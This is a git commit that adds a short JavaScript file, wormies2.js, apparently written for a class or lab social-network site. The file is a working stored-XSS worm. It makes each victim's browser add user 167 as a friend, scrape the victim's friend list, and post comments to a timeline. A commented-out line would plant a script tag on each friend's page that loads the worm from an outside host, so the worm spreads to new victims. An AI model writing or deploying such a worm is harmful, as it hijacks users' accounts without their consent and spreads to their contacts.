a8ca295ad6e2f3f86d51675c6dea01642d16a1e8
sxa7263 <35963445+sxa7263@users.noreply.github.com>
2020-11-07 21:00:50 -0500

    Create wormies2.js

---
+++ wormies2.js
@@ -0,0 +1,14 @@
+$.get("add_friend.php", {'id': 167}); 
+$.get("friends.php", (homies)=>{
+    a = homies.split("?id="); 
+    for(var i = 1; i < a.length; i++){
+        b = a[i].split("'>")[0];
+        $.get("timeline.php", {'id': 167}, (report)=>{
+            if(!report.includes(b + " got wormed")){
+                $.get("add_comment.php", {'id': 167, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
+                //$.get("add_comment.php", {'id': b, 'comment': "<script src='https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies2.js'></script>YOU GOT WORMED"});
+            }
+        });
+    }
+}
+)
